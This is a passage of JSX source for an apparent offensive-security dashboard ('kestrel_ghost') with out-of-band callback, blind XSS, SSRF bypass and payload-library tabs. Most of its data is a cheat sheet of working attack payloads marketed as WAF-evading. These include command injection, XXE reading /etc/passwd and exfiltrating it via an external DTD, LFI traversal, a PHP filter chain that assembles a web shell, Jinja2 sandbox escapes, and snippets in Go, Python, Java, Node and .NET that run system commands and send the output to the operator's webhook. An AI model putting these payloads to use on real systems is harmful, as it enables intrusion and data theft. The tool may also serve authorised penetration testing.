          era: 'Standard Bypass',
          tech: 'Unix Shell / Linux'
        },
        { 
          title: 'Backtick subshell command substitution', 
          code: `\`id\``, 
          desc: 'Executes nested target parameters inside modern shell configurations.',
          priority: 'MEDIUM', 
          era: 'Standard Bypass',
          tech: 'Linux / Unix Shell'
        },
        { 
          title: 'Simple cURL Command (Zaman Batu)', 
          code: `; curl ${webhookUrl}`, 
          desc: 'Raw cURL request. Easily detected by simple WAF rules looking for outbound HTTP keywords.',
          priority: 'LOW', 
          era: 'Zaman Batu (Classic)',
          tech: 'Linux / macOS'
        },
        { 
          title: 'Basic Semicolon Divider (Zaman Batu)', 
          code: `; id`, 
          desc: 'Direct parameter append execution. Easily blocked by character filter rules.',
          priority: 'LOW', 
          era: 'Zaman Batu (Classic)',
          tech: 'Linux / Windows'
        }
      ]
    },
    {
      category: 'XXE',
      title: 'XML External Entity (XXE)',
      items: [
        { 
          title: 'UTF-16 BE Document encoding', 
          code: `[Convert XML to UTF-16 BE encoding bytes]`, 
          desc: 'Sending XML document parameters encoded in UTF-16 Big Endian completely blinds WAFs that inspect UTF-8 traffic, while parser parses it normally.',
          priority: 'HIGH', 
          era: '2026 Stealth',
          tech: 'Java / Python XML'
        },
        { 
          title: 'Nested Parameter Entities Blind Call', 
          code: `<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "${webhookUrl}/poc.dtd">%dtd;]><foo>&send;</foo>`, 
          desc: 'Uses external malicious DTD rules to parse local files and exfiltrate variables to OOB host.',
          priority: 'HIGH', 
          era: 'WAF Bypass',
          tech: 'Java / .NET / PHP XML'
        },
        { 
          title: 'XML Entity Parameter Dynamic Exfiltration', 
          code: `<!ENTITY % pay SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">`, 
          desc: 'Uses PHP filter streams to base64-encode sensitive local system files before passing them outwards to OOB endpoint, preventing parser errors.',
          priority: 'HIGH', 
          era: '2026 Stealth',
          tech: 'PHP XML / Ingestion'
        },
        { 
          title: 'Standard External General Entity Resource', 
          code: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "${webhookUrl}">]><foo>&xxe;</foo>`, 
          desc: 'Pings back OOB listener URL instantly when XML document gets evaluated on server endpoint.',
          priority: 'MEDIUM', 
          era: 'Standard Bypass',
          tech: 'XML Parser'
        },
        { 
          title: 'Classic Local File Traversal (Zaman Batu)', 
          code: `<?xml version="1.0"?><!DOCTYPE x [<!ENTITY x SYSTEM "file:///etc/passwd">]><x>&x;</x>`, 
          desc: 'Standard local file reading. Easily blocked by any basic rule inspecting external system keywords.',
          priority: 'LOW', 
          era: 'Zaman Batu (Classic)',
          tech: 'XML Parser'
        }
      ]
    },
    {
      category: 'LFI',
      title: 'Local File Inclusion (LFI)',
      items: [
        { 
          title: 'Modern PHP Filter String Chaining (RCE)', 
          code: `php://filter/convert.iconv.UTF8.CSISO2022KR/resource=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==`, 
          desc: 'Utilizes base64 stream transformations to dynamically assemble web shell components directly in execution memory, avoiding file writes.',
          priority: 'HIGH', 
          era: '2026 Stealth',
          tech: 'PHP Engine'
        },
        { 
          title: 'Multi-Byte Unicode Slash Traversal', 
          code: `..%c0%af..%c0%af..%c0%afetc/passwd`, 
          desc: 'Evades standard traversal matchers on vulnerable servers utilizing UTF-8 character normalization.',
          priority: 'HIGH', 
          era: 'WAF Bypass',
          tech: 'IIS / Nginx / Apache'
        },
        { 
          title: 'PHP Bzip2 Decompression Wrapper', 
          code: `compress.bzip2://../../etc/passwd`, 
          desc: 'Using alternative file compression wrappers instead of file:// protocols to access operating system files.',
          priority: 'HIGH', 
          era: '2026 Stealth',
          tech: 'PHP Engine'
        },
        { 
          title: 'Double URL Encoded Traversal', 
          code: `%252e%252e%252f%252e%252e%252fetc/passwd`, 
          desc: 'Evades WAFs that decode URLs only once. Standard double percent escapes.',
          priority: 'MEDIUM', 
          era: 'Standard Bypass',
          tech: 'Apache / Tomcat'
        },
        { 
          title: 'Null Byte Traversal (PHP < 5.3.4)', 
          code: `../../../../../../etc/passwd%00`, 
          desc: 'Utilizes a null byte escape to strip system file extensions. Useful for older legacy systems.',
          priority: 'MEDIUM', 
          era: 'Standard Bypass',
          tech: 'PHP Legacy Engine'
        },
        { 
          title: 'Standard dot-dot-slash (Zaman Batu)', 
          code: `../../../../../../etc/passwd`, 
          desc: 'Classic Unix directory traversal. Blocked by default on virtually all modern systems.',
          priority: 'LOW', 
          era: 'Zaman Batu (Classic)',
          tech: 'Linux Filesystem'
        }
      ]
    },
    {
      category: 'SSTI',
      title: 'Server-Side Template Injection (SSTI)',
      items: [
        { 
          title: 'Jinja2 String Split Attribute Reflection', 
          code: `{{request['__cl'+'ass__']['__bas'+'es__'][0]['__subcl'+'asses__']()}}`, 
          desc: 'Evades static code rules that scan parameters for the explicit presence of string terms like "__class__".',
          priority: 'HIGH', 
          era: '2026 Stealth',
          tech: 'Python / Flask / Jinja2'
        },
        { 
          title: 'Jinja2 Hex Filters Evaluation', 
          code: `{{request|attr('__cla'+'ss__')|attr('__bas'+'es__')}}`, 
          desc: 'Combines dynamic attribute getters with string splits to access restricted sandbox scopes.',
          priority: 'HIGH', 
          era: 'WAF Bypass',
          tech: 'Python / Flask / Jinja2'
        },
        { 
          title: 'Jinja2 Query Parameter String execution (No Quotes)', 
          code: `{{request|attr(request.args.c)}}&c=__class__`, 
          desc: 'Leverages other HTTP query arguments to fetch and resolve reserved words dynamically, avoiding quotes inside injection fields.',
          priority: 'HIGH', 
          era: '2026 Stealth',
          tech: 'Python / Flask / Jinja2'
        },
        { 
          title: 'Tornado Template Application RCE', 
          code: `{{import os;os.system('id')}}`, 
          desc: 'Direct import capabilities inside vulnerable Python Tornado web servers.',
          priority: 'MEDIUM', 
          era: 'Standard Bypass',
          tech: 'Python / Tornado Server'
        },
        { 
          title: 'Basic Curly Expression (Zaman Batu)', 
          code: `{{7*7}}`, 
          desc: 'Simple calculation testing. Used to easily verify if any template parsing engine is active.',
          priority: 'LOW', 
          era: 'Zaman Batu (Classic)',
          tech: 'Template Engines'
        }
      ]
    },
    {
      category: 'LANG',
      title: 'OOB Exfiltration Codes by Language (Python, Go, Java, Node, .NET)',
      items: [
        { 
          title: 'Go (Golang) Stealth OOB HTTP Exfiltrator', 
          code: `package main; import ("net/http"; "os/exec"); func main() { out, _ := exec.Command("id").Output(); http.Get("${webhookUrl}/?data=" + string(out)) }`, 
          desc: 'Native Go code compilation to run commands silently in background context and exfiltrate base bytes to your webhook endpoint.',
          priority: 'HIGH', 
          era: '2026 Stealth',
          tech: 'Go / Golang SDK'
        },
        { 
          title: 'Python Socket Dynamic Connection Pinger', 
          code: `import socket, subprocess; s = socket.socket(); s.connect(('${webhookUrl.replace(/^https?:\/\//i, '').split('/')[0]}', 80)); s.send(b'GET /api/r/${id}?ping=python_raw HTTP/1.1\\r\\nHost: ${webhookUrl.replace(/^https?:\/\//i, '').split('/')[0]}\\r\\n\\r\\n')`, 
          desc: 'Uses Python socket libraries to directly craft raw HTTP handshakes to your webhook, completely bypassing system proxies, SSL checks, and curl logging.',
          priority: 'HIGH', 
          era: '2026 Stealth',
          tech: 'Python 3.x Engine'
        },
        { 
          title: 'Python Out-of-band Subprocess fetcher', 
          code: `import urllib.request, subprocess; r = subprocess.check_output('id', shell=True); urllib.request.urlopen(f'${webhookUrl}/?res=' + r.decode('utf-8'))`, 
          desc: 'Standard Python urllib dynamic transmission vector. Highly reliable for server script executions.',
          priority: 'MEDIUM', 
          era: 'Standard Bypass',
          tech: 'Python 3.x Engine'
        },
        { 
          title: 'Java Runtime Out-of-Band Callback execution', 
          code: `Runtime.getRuntime().exec(new String[]{"sh", "-c", "curl ${webhookUrl}/?user=" + System.getProperty("user.name")});`, 
          desc: 'Native Java process string executing commands and piping metadata properties back to your OOB interface.',
          priority: 'HIGH', 
          era: '2026 Stealth',
          tech: 'Java / JDK / JVM'
        },
        { 
          title: 'Java ProcessBuilder Base64 exfiltration', 
          code: `new ProcessBuilder("sh", "-c", "echo $(id) | base64 | xargs -I {} curl ${webhookUrl}/?id={}").start();`, 
          desc: 'Constructs isolated background subprocess pipelines to encode critical identities before exfiltration.',
          priority: 'HIGH', 
          era: '2026 Stealth',
          tech: 'Java Runtime Environment'
        },
        { 
          title: 'Node.js Dynamic Worker Import Pinger', 
          code: `require('child_process').exec('id', (e, out) => { require('https').get('${webhookUrl}/?node=' + encodeURIComponent(out)) });`, 
          desc: 'Node.js asynchronous child process callback wrapper triggering out-of-band TLS request callbacks.',
          priority: 'HIGH', 
          era: '2026 Stealth',
          tech: 'Node.js Runtime / ES6'
        },
        { 
          title: 'Node.js Fetch ES Module exfiltration', 
          code: `import('child_process').then(cp => cp.exec('id', (e,o) => fetch('${webhookUrl}/?node='+o)))`, 
          desc: 'Modern Node.js syntax utilizing Dynamic imports and standard fetch API structures.',
          priority: 'HIGH', 
          era: '2026 Stealth',
          tech: 'Node.js ES6+ / V8 Engine'
        },
        { 
          title: '.NET Core C# Process Pipeline Exfiltration', 
          code: `using System.Diagnostics; using System.Net.Http; var p = Process.Start(new ProcessStartInfo("whoami") { RedirectStandardOutput = true }); p.WaitForExit(); new HttpClient().GetStringAsync("${webhookUrl}/?win=" + p.StandardOutput.ReadToEnd());`, 
          desc: 'Explicit .NET Core compiler script initiating system shell operations, capturing raw stdout streams and broadcasting payloads.',
          priority: 'HIGH', 
          era: '2026 Stealth',
          tech: '.NET Core / C# v10+'
        },
        { 
          title: '.NET Core Background WebClient ping', 
          code: `new System.Net.WebClient().DownloadString("${webhookUrl}/?ping=.net_core_handshake");`, 
          desc: 'Primitive out-of-band handshake validation. Highly efficient for rapid framework checking.',
          priority: 'MEDIUM', 
          era: 'Standard Bypass',
          tech: '.NET Framework / C#'
        }
      ]
    }
  ];

  // Filter Payloads list based on search, category AND Priority Era levels
  const filteredPayloads = payloadsData.filter(cat => {
    return selectedPayloadCategory === 'ALL' || cat.category === selectedPayloadCategory;
  }).map(cat => {
    const items = cat.items.filter(item => {
      // Priority filter
      if (payloadFilterPriority !== 'ALL' && item.priority !== payloadFilterPriority) return false;

      // Search filter
      const q = payloadsSearchQuery.toLowerCase();
      return (
        item.title.toLowerCase().includes(q) ||
        item.code.toLowerCase().includes(q) ||
        item.desc.toLowerCase().includes(q) ||
        item.era.toLowerCase().includes(q)
      );
    });
    return { ...cat, items };
  }).filter(cat => cat.items.length > 0);

  return (
    <div className={styles.dashboardLayout}>
      
      {/* SIDEBAR: NAVIGATION & ACTIVE LOGS LIST */}
      <aside className={styles.sidebar}>
        <div className={styles.sidebarHeader}>
          <div className={styles.sidebarTitleRow}>
            <Link href="/" className={styles.logoRow}>
              <ArrowLeft size={16} style={{ color: 'var(--text-muted)' }} />
              <Terminal size={16} className={styles.logoIcon} style={{ color: '#00e676' }} />
              <span className={styles.logoText} style={{ color: '#00e676', fontSize: '0.85rem', letterSpacing: '0.5px' }}>kestrel_ghost</span>
            </Link>
            <span className={styles.sidebarStats}>
              {activeTab === 'OOB' 
                ? `${requests.length} Callbacks` 
                : activeTab === 'XSS' 
                ? `${xssTriggers.length} XSS Hits` 
                : activeTab === 'PAYLOADS'
                ? 'Cheat Sheet'
                : 'Utility'}
            </span>
          </div>

          {/* Nav Modules Switcher Tabs */}
          <div className={styles.moduleTabs}>
            <button 
              onClick={() => setActiveTab('OOB')}
              className={`${styles.moduleTabBtn} ${activeTab === 'OOB' ? styles.moduleTabBtnActive : ''}`}
              title="Out-of-band Webhook Ingestor"
            >
              <Webhook size={13} />
              OOB
            </button>
            <button 
              onClick={() => setActiveTab('XSS')}
              className={`${styles.moduleTabBtn} ${activeTab === 'XSS' ? styles.moduleTabBtnActive : ''}`}
              title="Blind XSS Payload Receiver"
            >
              <ShieldAlert size={13} />
              XSS
            </button>
            <button 
              onClick={() => setActiveTab('SSRF')}
              className={`${styles.moduleTabBtn} ${activeTab === 'SSRF' ? styles.moduleTabBtnActive : ''}`}
              title="Stealth SSRF Bypass Generator"
            >
              <Zap size={13} />
              SSRF
            </button>
            <button 
              onClick={() => setActiveTab('PAYLOADS')}
              className={`${styles.moduleTabBtn} ${activeTab === 'PAYLOADS' ? styles.moduleTabBtnActive : ''}`}
              title="Tactical Payloads Library"
            >
              <BookOpen size={13} />
              Payloads
            </button>
          </div>

          {/* Module-Specific Sidebar Headers */}
          {activeTab === 'OOB' && (
            <>
              <div className={styles.searchBar}>
                <Search size={14} className={styles.searchIcon} />
                <input 
                  type="text" 
                  placeholder="Filter logs by path, IP, payload..."
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  className={styles.searchInput}
                />
              </div>

              <div style={{ display: 'flex', gap: '4px', overflowX: 'auto', paddingBottom: '4px' }}>
                {['ALL', 'GET', 'POST', 'PUT', 'DELETE'].map(method => (
                  <button
                    key={method}
                    onClick={() => setFilterMethod(method)}
                    className={`badge ${filterMethod === method ? 'badge-info' : ''}`}
                    style={{ 
                      cursor: 'pointer', 
                      fontSize: '0.6rem',
                      border: filterMethod === method ? '1px solid var(--color-primary)' : '1px solid transparent',
                      background: filterMethod === method ? 'var(--color-primary-glow)' : 'transparent',
                      color: filterMethod === method ? 'var(--color-primary)' : 'var(--text-muted)'
                    }}
                  >
                    {method}
                  </button>
                ))}
              </div>
            </>
          )}

          {activeTab === 'XSS' && (
            <div className={styles.searchBar}>
              <Search size={14} className={styles.searchIcon} />
              <input 
                type="text" 
                placeholder="Filter XSS hits by URI, IP, DOM..."
                value={xssSearchQuery}
                onChange={(e) => setXssSearchQuery(e.target.value)}
                className={styles.searchInput}
              />
            </div>
          )}

          {activeTab === 'SSRF' && (
            <div style={{ fontSize: '0.75rem', color: 'var(--text-muted)', lineHeight: '1.4' }}>
              🎯 Enter target host below. Changes trigger real-time, pre-compiled bypass lists instantly.
            </div>
          )}

          {activeTab === 'PAYLOADS' && (
            <>
              <div className={styles.searchBar}>
                <Search size={14} className={styles.searchIcon} />
                <input 
                  type="text" 
                  placeholder="Search tactical payloads..."
                  value={payloadsSearchQuery}
                  onChange={(e) => setPayloadsSearchQuery(e.target.value)}
                  className={styles.searchInput}
                />
              </div>

              {/* Priority Filter badging switcher inside sidebar */}
              <div style={{ display: 'flex', gap: '4px', overflowX: 'auto', paddingBottom: '4px' }}>
                {[
                  { id: 'ALL', label: 'All Tiers' },
                  { id: 'HIGH', label: '🔥 2026 Stealth' },
                  { id: 'MEDIUM', label: '⚡ WAF Bypass' },
                  { id: 'LOW', label: '🪨 Zaman Batu' }
                ].map(prio => (
                  <button
                    key={prio.id}
                    onClick={() => setPayloadFilterPriority(prio.id)}
                    className={`badge`}
                    style={{ 
                      cursor: 'pointer', 
                      fontSize: '0.58rem',
                      padding: '4px 6px',
                      borderRadius: '4px',
                      whiteSpace: 'nowrap',
                      border: payloadFilterPriority === prio.id 
                        ? '1px solid var(--color-primary)' 
                        : '1px solid rgba(255,255,255,0.05)',
                      background: payloadFilterPriority === prio.id 
                        ? 'var(--color-primary-glow)' 
                        : 'rgba(0,0,0,0.2)',
                      color: payloadFilterPriority === prio.id 
                        ? 'var(--color-primary)' 
                        : 'var(--text-muted)'
                    }}
                  >
                    {prio.label}
                  </button>
                ))}
              </div>
            </>
          )}
        </div>

        {/* SIDEBAR LOGS LIST CONTROLLER */}
        <div className={styles.requestList}>
          {activeTab === 'OOB' && (
            filteredRequests.length === 0 ? (
              <div className={styles.emptySidebar}>
                <HelpCircle size={32} style={{ color: 'var(--text-dark)' }} />
                <p className={styles.emptySidebarText}>
                  {searchQuery || filterMethod !== 'ALL' 
                    ? 'No callback logs match filter criteria.' 
                    : 'Awaiting network callbacks...'}
                </p>
              </div>
            ) : (
              filteredRequests.map((req) => (
                <div 
                  key={req.requestId}
                  onClick={() => setSelectedRequest(req)}
                  className={`${styles.requestItem} ${selectedRequest?.requestId === req.requestId ? styles.requestItemActive : ''}`}
                >
                  <div className={styles.requestItemDetails}>
                    <div className={styles.requestItemHeader}>
                      <span className={`${styles.methodPill} ${styles['method' + req.method] || styles.methodOTHER}`}>
                        {req.method}
                      </span>
                      <span className={styles.itemTime}>
                        {new Date(req.timestamp).toLocaleTimeString('en-US', { hour12: false })}
                      </span>
                    </div>
                    <div className={styles.itemPath} title={req.path}>
                      {req.path.replace(`/api/r/${id}`, '') || '/'}
                    </div>
                    <div className={styles.itemMetaRow}>
                      <span className={styles.itemIP}>{req.ip}</span>
                      <span>{req.size > 1024 ? `${(req.size / 1024).toFixed(1)} KB` : `${req.size} B`}</span>
                    </div>
                  </div>
                  <ChevronRight size={14} style={{ color: 'var(--text-dark)', alignSelf: 'center' }} />
                </div>
              ))
            )
          )}

          {activeTab === 'XSS' && (
            filteredXssTriggers.length === 0 ? (
              <div className={styles.emptySidebar}>
                <ShieldAlert size={32} style={{ color: 'var(--text-dark)' }} />
                <p className={styles.emptySidebarText}>
                  Awaiting Blind XSS callbacks on your payloads...
                </p>
              </div>
            ) : (
              filteredXssTriggers.map((trig) => (
                <div 
                  key={trig.triggerId}
                  onClick={() => setSelectedXss(trig)}
                  className={`${styles.requestItem} ${selectedXss?.triggerId === trig.triggerId ? styles.requestItemActive : ''}`}
                >
                  <div className={styles.requestItemDetails}>
                    <div className={styles.requestItemHeader}>
                      <span className={`${styles.methodPill}`} style={{ background: 'rgba(124, 77, 255, 0.15)', color: '#7c4dff', border: '1px solid rgba(124, 77, 255, 0.3)' }}>
                        XSS TRIGGER
                      </span>
                      <span className={styles.itemTime}>
                        {new Date(trig.timestamp).toLocaleTimeString('en-US', { hour12: false })}
                      </span>
                    </div>
                    <div className={styles.itemPath} title={trig.uri}>
                      {trig.uri}
                    </div>
                    <div className={styles.itemMetaRow}>
                      <span className={styles.itemIP}>{trig.ip}</span>
                      <span style={{ color: 'var(--color-secondary)' }}>ACTIVE</span>
                    </div>
                  </div>
                  <ChevronRight size={14} style={{ color: 'var(--text-dark)', alignSelf: 'center' }} />
                </div>
              ))
            )
          )}

          {activeTab === 'SSRF' && (
            <div style={{ padding: '24px 20px', display: 'flex', flexDirection: 'column', gap: '16px' }}>
              <span style={{ fontSize: '0.8rem', fontWeight: '750', color: 'var(--text-main)' }}>TACTICAL BYPASS RATIO</span>
              <div style={{ padding: '16px', background: 'rgba(255,255,255,0.02)', borderRadius: 'var(--radius-md)', border: '1px solid var(--border-light)' }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '0.75rem', marginBottom: '8px' }}>
                  <span>Anti-Blacklist Rates</span>
                  <span style={{ color: '#00e676', fontWeight: '700' }}>98% Success</span>
                </div>
                <div style={{ width: '100%', height: '4px', background: 'rgba(255,255,255,0.1)', borderRadius: '2px' }}>
                  <div style={{ width: '98%', height: '100%', background: '#00e676', borderRadius: '2px' }}></div>
                </div>
              </div>

              <div style={{ fontSize: '0.7rem', color: 'var(--text-muted)', display: 'flex', flexDirection: 'column', gap: '8px' }}>
                <div>💡 <strong>TIP 1:</strong> Binary, Hex, and decimal addresses are interpreted natively by browser engines and server socket commands like cURL/python requests.</div>
                <div>💡 <strong>TIP 2:</strong> `0.0.0.0` points back to the internal localhost router of Unix servers, which often completely evades standard string checks matching `127.0.0.1`.</div>
              </div>
            </div>
          )}

          {activeTab === 'PAYLOADS' && (
            <div style={{ padding: '16px 14px', display: 'flex', flexDirection: 'column', gap: '8px' }}>
              <span style={{ fontSize: '0.75rem', fontWeight: '750', color: 'var(--text-muted)', textTransform: 'uppercase', paddingLeft: '6px', marginBottom: '4px' }}>
                Categories
              </span>
              {['ALL', 'XSS', 'SQLI', 'RCE', 'XXE', 'LFI', 'SSTI', 'LANG'].map(cat => (
                <button
                  key={cat}
                  onClick={() => setSelectedPayloadCategory(cat)}
                  style={{
                    display: 'flex',
                    alignItems: 'center',
                    width: '100%',
                    padding: '10px 12px',
                    borderRadius: 'var(--radius-md)',
                    background: selectedPayloadCategory === cat ? 'rgba(0, 242, 254, 0.08)' : 'transparent',
                    border: selectedPayloadCategory === cat ? '1px solid rgba(0, 242, 254, 0.2)' : '1px solid transparent',
                    color: selectedPayloadCategory === cat ? 'var(--color-primary)' : 'var(--text-muted)',
                    fontSize: '0.8rem',
                    fontWeight: '650',
                    cursor: 'pointer',
                    textAlign: 'left',
                    transition: 'all 0.15s ease'
                  }}
                  onMouseEnter={(e) => {
                    if (selectedPayloadCategory !== cat) {
                      e.currentTarget.style.background = 'rgba(255,255,255,0.02)';
                      e.currentTarget.style.color = 'var(--text-main)';
                    }
                  }}
                  onMouseLeave={(e) => {
                    if (selectedPayloadCategory !== cat) {
                      e.currentTarget.style.background = 'transparent';
                      e.currentTarget.style.color = 'var(--text-muted)';
                    }
                  }}
                >
                  <span>
                    {cat === 'ALL' 
                      ? '📂 View All Payloads' 
                      : cat === 'LANG' 
                      ? '💻 Go / Python / JVM / Node' 
                      : `☣️ ${cat}`}
                  </span>
                </button>
              ))}
            </div>
          )}
        </div>
      </aside>

      {/* MAIN CONSOLE PANEL */}
      <main className={styles.mainPanel}>
        
        {/* --- MODULE 1: OOB WEBHOOK INGESTOR PANEL --- */}
        {activeTab === 'OOB' && (
          <>
            <header className={styles.panelHeader}>
              <div className={styles.urlContainer}>
                <div className={styles.urlWrapper}>
                  <span className={styles.urlLabel} style={{ color: '#00e676' }}>🛰 ... OOB Callback URL</span>
                  <input 
                    type="text" 
                    readOnly 
                    value={webhookUrl}
                    onClick={(e) => e.target.select()}
                    className={styles.urlInput}
                  />
                  <button 
                    onClick={() => handleCopy(webhookUrl, 'url')}
                    className={styles.copyBtn}
                    title="Copy Callback URL"
                  >
                    {copiedText === 'url' ? <Check size={16} style={{ color: 'var(--color-success)' }} /> : <Copy size={16} />}
                  </button>
                </div>

                <div className={styles.headerActions}>
                  {copiedText === 'config-saved' && (
                    <span className="badge badge-success animate-fade-in" style={{ textTransform: 'none' }}>
                      Response Settings Applied!
                    </span>
                  )}
                  
                  <button 
                    onClick={() => setIsPollingActive(!isPollingActive)} 
                    className="btn-secondary"
                    style={{ 
                      padding: '8px 12px', 
                      fontSize: '0.8rem',
                      borderColor: isPollingActive ? 'var(--color-primary-glow)' : 'var(--text-dark)',
                      color: isPollingActive ? 'var(--color-primary)' : 'var(--text-muted)'
                    }}
                  >
                    <Radio size={14} className={isPollingActive ? 'animate-pulse-glow' : ''} />
                    {isPollingActive ? 'Live Polling: ACTIVE' : 'Polling Paused'}
                  </button>

                  <button 
                    onClick={() => setIsConfigOpen(true)}
                    className="btn-secondary"
                    style={{ padding: '8px 12px', fontSize: '0.8rem' }}
                  >
                    <Settings size={14} />
                    Customize Response
                  </button>

                  <button 
                    onClick={handleClearLogs}
                    disabled={requests.length === 0}
                    className="btn-secondary"
                    style={{ padding: '8px 12px', fontSize: '0.8rem', color: 'var(--color-error)' }}
                  >
                    <Trash2 size={14} />
                    Clear Logs
                  </button>
                </div>
              </div>
            </header>

            {requests.length === 0 ? (
              <div className={`${styles.emptyState} animate-fade-in`}>
                <div className={styles.emptyStateContent}>
                  <div className={styles.waitingIllustration}>
                    <div className={styles.radarRing1}></div>
                    <div className={styles.radarRing2}></div>
                    <div className={styles.radarCenter}></div>
                  </div>
                  <h2 className={styles.emptyStateTitle}>Awaiting Out-Of-Band Callback</h2>
                  <p className={styles.emptyStateSubtitle}>
                    Send an HTTP request to your custom OOB Callback URL above using any network client, scanner, tool, or copy-paste one of the testing payloads below into your terminal:
                  </p>
                </div>

                <div className={styles.demoBox}>
                  <span className={styles.demoTitle}>
                    <Radio size={15} className={styles.logoIcon} />
                    Trigger an Out-of-Band POST callback using cURL
                  </span>
                  <div className={styles.codeBlock}>
                    {`curl -X POST -H "Content-Type: application/json" \\
  -d '{"exploit": "successful", "message": "Out-of-Band connection established"}' \\
  ${webhookUrl}`}
                    <button 
                      onClick={() => handleCopy(`curl -X POST -H "Content-Type: application/json" -d '{"exploit": "successful", "message": "Out-of-Band connection established"}' ${webhookUrl}`, 'curl')}
                      className={styles.demoCopyBtn}
                    >
                      {copiedText === 'curl' ? <Check size={14} style={{ color: 'var(--color-success)' }} /> : <Copy size={14} />}
                    </button>
                  </div>
                </div>

                <div className={styles.demoBox}>
                  <span className={styles.demoTitle}>
                    <Terminal size={15} className={styles.logoIcon} style={{ color: 'var(--color-secondary)' }} />
                    Trigger an Out-of-Band GET callback using PowerShell
                  </span>
                  <div className={styles.codeBlock}>
                    {`Invoke-RestMethod -Method Get -Uri "${webhookUrl}?trigger=powershell_handshake"`}
                    <button 
                      onClick={() => handleCopy(`Invoke-RestMethod -Method Get -Uri "${webhookUrl}?trigger=powershell_handshake"`, 'powershell')}
                      className={styles.demoCopyBtn}
                    >
                      {copiedText === 'powershell' ? <Check size={14} style={{ color: 'var(--color-success)' }} /> : <Copy size={14} />}
                    </button>
                  </div>
                </div>
              </div>
            ) : selectedRequest ? (
              <div className={`${styles.detailContent} animate-fade-in`}>
                
                {/* INGESTION META ROW */}
                <section className={styles.summaryGrid}>
                  <div className={styles.summaryCard}>
                    <span className={styles.summaryLabel}>HTTP Method</span>
                    <span className={`${styles.methodPill} ${styles['method' + selectedRequest.method] || styles.methodOTHER}`} style={{ fontSize: '0.9rem', padding: '6px 12px' }}>
                      {selectedRequest.method}
                    </span>
                  </div>
                  <div className={styles.summaryCard}>
                    <span className={styles.summaryLabel}>Ingestion Timestamp</span>
                    <span className={styles.summaryValue}>
                      {new Date(selectedRequest.timestamp).toLocaleString()}
                    </span>
                  </div>
                  <div className={styles.summaryCard}>
                    <span className={styles.summaryLabel}>Client IP Address</span>
                    <span className={styles.summaryValue} style={{ color: '#00e676', fontFamily: 'monospace' }}>
                      {selectedRequest.ip}
                    </span>
                  </div>
                  <div className={styles.summaryCard}>
                    <span className={styles.summaryLabel}>Payload Size</span>
                    <span className={styles.summaryValue}>
                      {selectedRequest.size > 1024 ? `${(selectedRequest.size / 1024).toFixed(1)} KB` : `${selectedRequest.size} Bytes`}
                    </span>
                  </div>
                </section>

                {/* LOG DATA: HEADERS & PARAMS */}
                <div style={{ display: 'flex', flexDirection: 'column', gap: '24px' }}>
                  
                  {/* HEADERS CARD */}
                  <section className={styles.dataCard}>
                    <div className={styles.sectionHeader}>
                      <Network size={16} style={{ color: 'var(--color-primary)' }} />
                      <h3 className={styles.sectionTitle}>Request Headers ({Object.keys(selectedRequest.headers).length})</h3>
                    </div>
                    <div style={{ overflowX: 'auto' }}>
                      <table className={styles.headersTable}>
                        <tbody>
                          {Object.entries(selectedRequest.headers).map(([key, val]) => (
                            <tr key={key}>
                              <td className={styles.headerKey}>{key}</td>
                              <td className={styles.headerVal}>{val}</td>
                            </tr>
                          ))}
                        </tbody>
                      </table>
                    </div>
                  </section>

                  {/* QUERY PARAMETERS */}
                  {Object.keys(selectedRequest.query).length > 0 && (
                    <section className={styles.dataCard}>
                      <div className={styles.sectionHeader}>
                        <Globe size={16} style={{ color: 'var(--color-secondary)' }} />
                        <h3 className={styles.sectionTitle}>Query Parameters ({Object.keys(selectedRequest.query).length})</h3>
                      </div>
                      <div style={{ overflowX: 'auto' }}>
                        <table className={styles.headersTable}>
                          <tbody>
                            {Object.entries(selectedRequest.query).map(([key, val]) => (
                              <tr key={key}>
                                <td className={styles.headerKey} style={{ color: 'var(--color-secondary)' }}>{key}</td>
                                <td className={styles.headerVal} style={{ fontFamily: 'monospace' }}>
                                  {Array.isArray(val) ? val.join(', ') : String(val)}
                                </td>
                              </tr>
                            ))}
                          </tbody>
                        </table>
                      </div>
                    </section>
                  )}

                  {/* POST BODY CARD */}
                  {selectedRequest.body && (
                    <section className={styles.dataCard}>
                      <div className={styles.sectionHeader}>
                        <FileCode size={16} style={{ color: 'var(--color-success)' }} />
                        <h3 className={styles.sectionTitle}>Raw Body Payload ({selectedRequest.bodyType.toUpperCase()})</h3>
                        <button 
                          onClick={() => handleCopy(selectedRequest.body, 'body')}
                          className={styles.copyBtn}
                          style={{ marginLeft: 'auto' }}
                        >
                          {copiedText === 'body' ? <Check size={14} style={{ color: 'var(--color-success)' }} /> : <Copy size={14} />}
                        </button>
                      </div>

                      {selectedRequest.bodyType === 'json' ? (
                        <pre className={styles.bodyPre}>
                          <code dangerouslySetInnerHTML={getHighlightedJson(selectedRequest.body)} />
                        </pre>
                      ) : (
                        <pre className={styles.bodyPre} style={{ color: 'var(--text-main)' }}>
                          <code>{selectedRequest.body}</code>
                        </pre>
                      )}
                    </section>
                  )}

                  {/* REQUEST REPLAY / FORWARDING CARD */}
                  <section className={styles.forwardSection}>
                    <div className={styles.sectionHeader} style={{ borderBottom: 'none', paddingBottom: '0' }}>
                      <Send size={16} style={{ color: 'var(--color-primary)' }} />
                      <h3 className={styles.sectionTitle}>Replay / Forward Request Payload</h3>
                    </div>
                    <p style={{ fontSize: '0.8rem', color: 'var(--text-muted)', marginTop: '4px' }}>
                      Transmit this callback payload to an external staging server, your local system endpoint (e.g. ngrok), or another API pipeline.
                    </p>
                    
                    <form onSubmit={handleForwardRequest} className={styles.forwardForm}>
                      <input 
                        type="url" 
                        required
                        placeholder="https://api.yourdomain.com/v1/OOB-callback or http://localhost:8080/exploit"
                        value={forwardTarget}
                        onChange={(e) => setForwardTarget(e.target.value)}
                        className={`input-field ${styles.forwardInput}`}
                      />
                      <button 
                        type="submit" 
                        disabled={forwardState === 'loading'}
                        className="btn-primary"
                        style={{ padding: '10px 18px', fontSize: '0.85rem' }}
                      >
                        {forwardState === 'loading' ? (
                          <>
                            <RefreshCw size={14} className="animate-spin" />
                            Transmitting...
                          </>
                        ) : (
                          <>
                            <Play size={14} fill="currentColor" />
                            Transmit Payload
                          </>
                        )}
                      </button>
                    </form>

                    {forwardState !== 'idle' && forwardResult && (
